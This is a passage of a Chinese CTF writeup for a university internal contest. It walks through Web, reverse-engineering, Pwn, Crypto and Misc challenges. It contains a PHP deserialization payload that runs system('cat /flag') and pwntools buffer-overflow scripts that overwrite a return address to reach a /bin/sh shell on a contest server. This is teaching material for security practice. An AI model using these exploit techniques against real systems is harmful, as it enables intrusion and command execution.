class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Cry&#123;</span><br><span class="line">        public $C;</span><br><span class="line">        public $fl4g;</span><br><span class="line">        public function halo()&#123;</span><br><span class="line">                echo &quot;这么多代码，是不是不想看！！！！！！！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function y0u_hacker()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo $this-&gt;fl4g;</span><br><span class="line">                eval($this-&gt;fl4g);</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo &quot;Cry类死了！&quot;;</span><br><span class="line">                $this-&gt;C-&gt;s4y_l0v3();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Love&#123;</span><br><span class="line">        public $B;</span><br><span class="line">        public function sea_said()&#123;</span><br><span class="line">                echo &quot;愿你一生努力，一生被爱！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function y0u_love()&#123;</span><br><span class="line">                echo &quot;想要的都拥有，得不到的都释怀！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;s4y_l0v3明天再写</span><br><span class="line">        function __call($method,$value)&#123; &#x2F;&#x2F;最终的利用方式</span><br><span class="line">                $this-&gt;B-&gt;y0u_hacker();</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo &quot;Love类死了！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$Cry_1 &#x3D; new Cry();</span><br><span class="line">$Cry_2 &#x3D; new Cry(); &#x2F;&#x2F;Love类的B参数对象</span><br><span class="line">$Cry_2-&gt;fl4g &#x3D; &quot;system(&#39;cat &#x2F;flag&#39;);&quot;;</span><br><span class="line">&#x2F;&#x2F;通过Cry_1对象的析构，调用s4y_l0v3方法</span><br><span class="line">$Love_1 &#x3D; new Love();</span><br><span class="line">$Love_1-&gt;B &#x3D; $Cry_2;</span><br><span class="line">$Cry_1-&gt;C &#x3D; $Love_1;</span><br><span class="line">echo serialize($Cry_1);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;O:3:&quot;Cry&quot;:2:&#123;s:1:&quot;C&quot;;O:4:&quot;Love&quot;:1:&#123;s:1:&quot;B&quot;;O:3:&quot;Cry&quot;:2:&#123;s:1:&quot;C&quot;;N;s:4:&quot;fl4g&quot;;s:20:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;;&#125;&#125;s:4:&quot;fl4g&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>生成payload,POST传参，得到flag</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvrjxO.png" alt="JvrjxO.png"></p>
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="0x00-baby-re"><a href="#0x00-baby-re" class="headerlink" title="0x00.baby_re"></a>0x00.baby_re</h3><p>出题人：0bs3rver</p>
+<p>这题旨在让大家了解最基本的逆向。</p>
+<p>顾名思义，很简单的一道re题，根据题目提示用ida打开并按下F5，可以得到一段main代码。</p>
+<p>观察代码逻辑可得，该程序让你输入flag，通过check函数进行比对，并根据check函数的返回值判断flag是否正确。而点进check函数，可以看到该函数把你的输入进行运算，然后再与flag数组进行比对，一旦错误则返回0。</p>
+<p>点进flag数组会是一大段数值，这时我们就可以知道，需要将这段值提取出来，通过逆向算法来get flag。</p>
+<p>其中有几个细节需要注意，比如flag为int数组，而int在内存中是占四个字节的，在ida里面db，dw，dd分别代表1、2、4个字节，一些同学点进flag数组可能会很懵逼，不知道这都是啥玩意，真正的数据是什么。</p>
+<p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-1.png" alt=""></p>
+<p>仔细观察可以发现只有第一个数据：350h前面的类型是dd，后面的都是db。</p>
+<p>我们需要单击前面的类型，然后按下d，就可以方便的将类型转化为我们需要的dd，这样就能轻松的找到我们需要的信息。</p>
+<p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-2.png" alt=""></p>
+<p>算法逆向很简单，这里就不多赘述了。</p>
+<p>唯一需要注意的可能是这个地方。</p>
+<p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-3.png" alt=""></p>
+<p>这行代码的原型是 a[i] = c1[i] &lt;&lt; 3; ，这里char* 表示的是后面这个地址指向的是一个char类型的字符串，前面再带一个<em>是因为我们需要的是这个地址里面的值而不是这个地址，再前面的\</em>则是乘法符号。</p>
+<p>附上源代码及解题脚本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span> <span class="params">(<span class="keyword">char</span>* c)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">40</span>] = &#123;<span class="number">848</span>,<span class="number">864</span>,<span class="number">776</span>,<span class="number">856</span>,<span class="number">1016</span>,<span class="number">688</span>,<span class="number">808</span>,<span class="number">792</span>,<span class="number">392</span>,<span class="number">424</span>,<span class="number">792</span>,<span class="number">696</span>,<span class="number">384</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">792</span>,<span class="number">696</span>,<span class="number">840</span>,<span class="number">872</span>,<span class="number">896</span>,<span class="number">864</span>,<span class="number">808</span>,<span class="number">1000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">40</span>] = <span class="string">"\0"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input your flag:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,c);</span><br><span class="line">    <span class="keyword">if</span>(check(c))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wow, your flag is right!\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Maybe you need to try again~\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span> <span class="params">(<span class="keyword">char</span>* c1)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">40</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">30</span>; i++)&#123;</span><br><span class="line">            a[i] = c1[i] &lt;&lt; <span class="number">3</span>;</span><br><span class="line">            a[i] += <span class="number">0x10</span>;</span><br><span class="line">            a[i] ^= <span class="number">0x10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">30</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(flag[i] != a[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num = [<span class="number">848</span>,<span class="number">864</span>,<span class="number">776</span>,<span class="number">856</span>,<span class="number">1016</span>,<span class="number">688</span>,<span class="number">808</span>,<span class="number">792</span>,<span class="number">392</span>,<span class="number">424</span>,<span class="number">792</span>,<span class="number">696</span>,<span class="number">384</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">920</span>,<span class="number">792</span>,<span class="number">696</span>,<span class="number">840</span>,<span class="number">872</span>,<span class="number">896</span>,<span class="number">864</span>,<span class="number">808</span>,<span class="number">1000</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">	i ^= <span class="number">0x10</span></span><br><span class="line">	i -= <span class="number">0x10</span></span><br><span class="line">	flag += chr(i &gt;&gt; <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>flag{Re_15_S0ooooooooo_Simple}</p>
+<h3 id="0x01-ez-py"><a href="#0x01-ez-py" class="headerlink" title="0x01.ez_py"></a>0x01.ez_py</h3><p>出题人：0bs3rver</p>
+<p>这题旨在让大家了解基本的py知识。</p>
+<p>拿到题目可以看到是.pyc文件，百度可知这是.py文件编译后的产物，再次百度找到反编译网站，扔进去即可得到原py文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(message)</span>:</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = ord(i) ^ <span class="number">16</span></span><br><span class="line">        x = x + <span class="number">5</span></span><br><span class="line">        flag += chr(x)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">'qwLrfD;`JU`~"JY&gt;pOJ_;J,OOJZypJw&lt;ypJZqJ.;Oph'</span></span><br></pre></td></tr></table></figure>
+
+<p>这题甚至不用逆向，只需要加上一行 print(encode(message)) 即可</p>
+<p>flag{Y0u_Jus7_N3ed_T0_Add_One_l1ne_Of_C0de}</p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="0x00-just-run"><a href="#0x00-just-run" class="headerlink" title="0x00 . just_run"></a>0x00 . just_run</h3><p>​    登录Ubuntu，ctrl + alt +T打开终端。</p>
+<p>​    输入命令：nc 121.41.113.245 10002</p>
+<p>​    得到如下界面：</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvrxMD.png" alt="JvrxMD.png"></p>
+<p>​    然后啥也没有了。。。。</p>
+<p>​    反汇编分析一下：</p>
+<p>​    打开64位ida，将题目的附件(ELF文件)拖到ida中打开，默认选第一个，确定。</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvsSqH.png" alt="JvsSqH.png"></p>
+<p>​    左边是主要函数，我们双击main，按F5，得到反汇编的伪代码。</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvsPII.png" alt="JvsPII.png"></p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvsCdA.png" alt="JvsCdA.png"></p>
+<p>​    不管选择y还是n，都会直接执行system(“/bin/sh”);这行代码等同于在远程终端中执行“/bin/sh”。</p>
+<p>​    因此执行该代码后，我们可以直接执行命令：cat flag.txt，得到flag。</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvrXRK.png" alt="JvrXRK.png"></p>
+<p>​    flag{294dbf32-54ea-4c2f-a0d3-e3221df75913}</p>
+<h3 id="0x01-2048"><a href="#0x01-2048" class="headerlink" title="0x01 . 2048"></a>0x01 . 2048</h3><p>​    本题用到了<a href="https://segmentfault.com/a/1190000007977460" target="_blank" rel="noopener">栈帧基础知识</a>。</p>
+<p>​    同上，执行nc 121.41.113.245 10000</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvsARf.png" alt="JvsARf.png"></p>
+<p>​    是个小游戏，要拿到10000分才能拿到flag。</p>
+<p>​    用ida64反汇编附件，虽然函数有点多，不过发现如下关键代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v7 &lt;= <span class="number">9999</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)off_401B80 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x41</span>u:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x61</span>u:</span><br><span class="line">        move_left_pre();</span><br><span class="line">        rand_num();</span><br><span class="line">        print_game();</span><br><span class="line">        v7 = total;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x44</span>u:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x64</span>u:</span><br><span class="line">        move_right_pre();</span><br><span class="line">        rand_num();</span><br><span class="line">        print_game();</span><br><span class="line">        v7 = total;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x51</span>u:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x71</span>u:</span><br><span class="line">        you_quit();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x53</span>u:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x73</span>u:</span><br><span class="line">        move_down_pre();</span><br><span class="line">        rand_num();</span><br><span class="line">        print_game();</span><br><span class="line">        v7 = total;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x57</span>u:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x77</span>u:</span><br><span class="line">        move_up_pre();</span><br><span class="line">        rand_num();</span><br><span class="line">        print_game();</span><br><span class="line">        v7 = total;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  your_flag(v6);</span><br></pre></td></tr></table></figure>
+
+<p>​    也就是说，程序用v7变量记录分数，超过10000分就会退出循环，执行you_flag()函数。    </p>
+<p>​    由前面代码可见，buf变量通过read函数读入，而且读取长度为0x200，所以可能发生溢出。</p>
+<p>​    我们知道，函数中的局部变量都会存在栈上，如果read函数中对buf输入的长度过长，就会覆盖栈上的其他变量，比如说v7。</p>
+<p>​    光标放在变量上:</p>
+<p><a href="https://imgchr.com/i/JvsZQS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvsZQS.png" alt="JvsZQS.png"></a></p>
+<p><img src="https://s1.ax1x.com/2020/05/02/Jvsesg.png" alt="Jvsesg.png"></p>
+<p>​    发现两者距离栈底(即rbp)的偏移分别为：-0xF和-0x4。</p>
+<p>​    也就是说，我们在buf中先输入11(0xF-0x4 = 0xB)个字节来填满数组，然后再输入10000，就会将v7变量修改成10000分。然后就能跳出游戏循环，执行you_flag()函数。</p>
+<p>​    脚本如下，需要先额外安装一个python库，<a href="https://www.cnblogs.com/pcat/p/5451780.html" target="_blank" rel="noopener">pwntools</a>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *							<span class="comment">#使用pwntools库</span></span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10000</span>)				<span class="comment">#远程连接</span></span><br><span class="line">p.recvuntil(<span class="string">"Well,R U a true player?[Y/N]"</span>)		</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">0xB</span></span><br><span class="line">payload += p64(<span class="number">10000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>flag：flag{a1cbd38a-d468-440d-b623-6214aad97f68}</p>
+<h3 id="0x02-joke"><a href="#0x02-joke" class="headerlink" title="0x02 . joke"></a>0x02 . joke</h3><p>​    本题也用到了<a href="https://segmentfault.com/a/1190000007977460" target="_blank" rel="noopener">栈帧基础知识</a>。</p>
+<p>​    丢ida64，程序流程还挺简单。</p>
+<p>​    选1听笑话没p用😁😁😁。</p>
+<p><a href="https://imgchr.com/i/JvsmLQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvsmLQ.png" alt="JvsmLQ.png"></a></p>
+<p>​    漏洞在input函数，和2048一样，read函数存在溢出。</p>
+<p><a href="https://imgchr.com/i/JvsuZj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvsuZj.png" alt="JvsuZj.png"></a></p>
+<p>​    而且程序中有一个mistake函数，从来没有用到过，而mistake函数执行了我们想要的system(“/bin/sh”)。</p>
+<p><a href="https://imgchr.com/i/Jvs9Zd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/Jvs9Zd.png" alt="Jvs9Zd.png"></a></p>
+<p>​    而mistake的地址是:0x40089C。</p>
+<p><a href="https://imgchr.com/i/JvsFit" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvsFit.png" alt="JvsFit.png"></a></p>
+<p>​    可以考虑用上题相同的栈溢出和ROP，将input函数的返回地址改成mistake地址。</p>
+<p>​    而后系统执行完input函数，发现栈上的返回地址被改成了mistake函数的地址，也就直接执行mistake函数了。</p>
+<p>​    脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'121.41.113.245'</span>,<span class="number">10001</span>)</span><br><span class="line">p.recvuntil(<span class="string">"What do you say?"</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x30</span>		<span class="comment">#填充栈空间</span></span><br><span class="line">payloda+=p64(<span class="number">0</span>)			<span class="comment">#填充旧的rbp(32位为ebp)</span></span><br><span class="line">payload+=p64(<span class="number">0x40089C</span>)	 <span class="comment">#覆盖input函数返回地址</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>flag：flag{3ae15963-fd5c-464c-ba30-299cc5a4e481}</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="0x00-base64"><a href="#0x00-base64" class="headerlink" title="0x00 . base64"></a>0x00 . base64</h3><p>​        提示为IMG，这题是base64转图片(<a href="http://tool.chinaz.com/tools/imgtobase/" target="_blank" rel="noopener">在线工具</a>)。</p>
+<p>​        解得如下图片：</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvskJP.png" alt="JvskJP.png"></p>
+<p>​        题目中另外还有一个压缩包，而上述图片是解压密码。</p>
+<p>​        解压后打开flag.txt，将字符串base64解码。</p>
+<p>​        得到：flag{1s_my_p4ssword_t0o_5imple_?}</p>
+<h3 id="0x01-兔老大"><a href="#0x01-兔老大" class="headerlink" title="0x01 . 兔老大"></a>0x01 . 兔老大</h3><p>提示就是Rabbit加密，密钥就是rabbit</p>
+<p>解密过后，base32解码，拿到flag</p>
+<h3 id="0x02-easy-caesar"><a href="#0x02-easy-caesar" class="headerlink" title="0x02.easy_caesar"></a>0x02.easy_caesar</h3><p>出题人：0bs3rver</p>
+<p>根据题目及其描述可以看出利用了凯撒加密，但是给出的文档是一串大小写字母+符号的字符串，而凯撒加密是仅仅只有字母的。</p>
+<p>可以联想到是不是在别的地方使用了移位，而最容易把这些东西串联起来的，就是ASCII码，在计算机中的字符一般都是使用ASCII码值进行存储，再联想到经典的凯撒加密算法是移动3位，所以可以写出解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caesar = <span class="string">']p&#123;k]|X6TmI3MWL6f4&lt;J\Zv&#125;[3QkP6Qkfo&lt;GP[Er][LoQ3T@'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> caesar:</span><br><span class="line">	flag += chr(ord(i)<span class="number">-3</span>)</span><br><span class="line">	</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>但是解开并不是flag字符串，细细观察后面还有 = 符号，很容易联想到ctf中最常见的编码格式–base64，解密即可get flag。</p>
+<p>flag{1t’s_Fak3_Ca3sar_C1pher}</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x00-Where-am-I"><a href="#0x00-Where-am-I" class="headerlink" title="0x00 . Where_am_I"></a>0x00 . Where_am_I</h3><p>​        这一题的灵感来自2019年10月24日菜鸟教程公众号，以及Nazo_game网站。</p>
+<p>​        打开图片，下方提示了RGB，分别对应了度分秒，而且north和west也比较明确的提示了，这题和地理经纬度有关。</p>
+<ul>
+<li><p>登录pc端QQ，ctrl + alt + A，光标放在两个色块上即可知道north对应色块rgb为（40,41,21），west的rgb为（74,2,40）。</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/Jvrzse.png" alt="Jvrzse.png"></p>
+</li>
+<li><p>跟方向对应起来就是40°41′21″N 74°02′40″W。</p>
+</li>
+<li><p>上Google Earth搜索(注意<a href="https://support.google.com/maps/answer/18539?co=GENIE.Platform%3DDesktop&hl=zh-Hans" target="_blank" rel="noopener">搜索语法</a>)，得到位置为自由女神像。</p>
+</li>
+</ul>
+<p>​        得到：flag{statue_of_liberty}</p>
+<h3 id="0x01-古老的计算机"><a href="#0x01-古老的计算机" class="headerlink" title="0x01 . 古老的计算机"></a>0x01 . 古老的计算机</h3><p>将图片放到winhex中，可以发现图片最下方存在很多…. ..</p>
+<p>根据题目古老的计算机，联想到2进制</p>
+<p>将….转换成1，..转换成0</p>
+<p>然后将二进制转换成字符串，拿到flag</p>
+<h3 id="0x02-double-flag"><a href="#0x02-double-flag" class="headerlink" title="0x02.double_flag"></a>0x02.double_flag</h3><p>出题人：0bs3rver</p>
+<p>这题下载下来是一个zip文件，但是解压会报错，我们可以联想到是不是文件出了什么问题（当然不是出题人弄错了…），用十六进制打开文件查看，发现前面少了zip头 504B0304 ，添加进去即可打开文件。</p>
+<p>打开后是两张图片，可以看到第二张图片和第一张一样但是有很明显的修改痕迹，可以联想到是修改了十六进制下的内容。搜索 flag或者是一一对比可以发现第一处不同在0x400，第二次不同在0x800，第三次在0x1000，很明显是个数列，同时第一次以后的不同就是竖向排列了（这里这样设置是为了让肉眼寻找的同学有一线生机…），即可得到flag。</p>
+<p>同时更推荐的方法是用工具进行对比，例如Beyond Compare，可以方便的对比各种文件，这里用十六进制比较打开两张图片，即可轻松get flag。</p>
+<p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-4.png" alt=""></p>
+<p>flag{1t’s_Imp0rtan7_To_Pr0t3ct_Your_Eye5}</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>Donate comment here.</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              
+                 <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              
+                 <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/06/01/s1rtwo_tp/" rel="prev" title="WUST内部赛（儿童节）wp">
+      <i class="fa fa-chevron-left"></i> WUST内部赛（儿童节）wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/01/30/s1rthree/" rel="next" title="WUST7月份内部赛wp">
+      WUST7月份内部赛wp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-签到题"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 . 签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-PHP是世界上最好的语言"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 . PHP是世界上最好的语言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-你喜欢甜饼吗"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 . 你喜欢甜饼吗</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE"><span class="nav-number">2.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-baby-re"><span class="nav-number">2.1.</span> <span class="nav-text">0x00.baby_re</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-ez-py"><span class="nav-number">2.2.</span> <span class="nav-text">0x01.ez_py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-just-run"><span class="nav-number">3.1.</span> <span class="nav-text">0x00 . just_run</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-2048"><span class="nav-number">3.2.</span> <span class="nav-text">0x01 . 2048</span></a></li><li class="nav-item nav-level-3"><a 